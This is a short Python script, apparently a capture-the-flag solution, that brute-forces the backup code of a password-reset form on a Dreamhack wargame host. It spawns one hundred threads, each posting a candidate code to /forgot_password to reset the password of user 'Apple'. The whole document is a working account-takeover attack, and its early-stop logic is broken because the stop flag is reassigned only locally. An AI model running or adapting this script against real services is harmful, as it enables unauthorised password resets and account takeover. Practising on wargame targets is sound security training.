import requests
import threading

TARGET_URL='http://host1.dreamhack.games:23166'
PASSWORD='1337'

class passwordThread(threading.Thread):
    def __init__(self,ThreadID,name,stop_thread,code,id):
        threading.Thread.__init__(self,target=forgot_password,args = (stop_thread,code,id))
        self.ThreadID=ThreadID
        self.name=name

def forgot_password(stop,code,id):
    if stop():
        return
    res=requests.post(TARGET_URL + '/forgot_password', data = {
        "userid":id,
        "newpassword":PASSWORD,
        "backupCode":code,
    })

    #print(res.text)

    stop = (res.text.find("Wrong BackupCode")==-1)

def bruteforce(limit,id):
    threads=list()
    stop=False
    for i in range(0,limit):
        threads.append(passwordThread(i,i,lambda : stop,i,id))
        threads[i].start()

    for i in range(0,limit):
        threads[i].join()
        
    print("Done")

bruteforce(100,"Apple")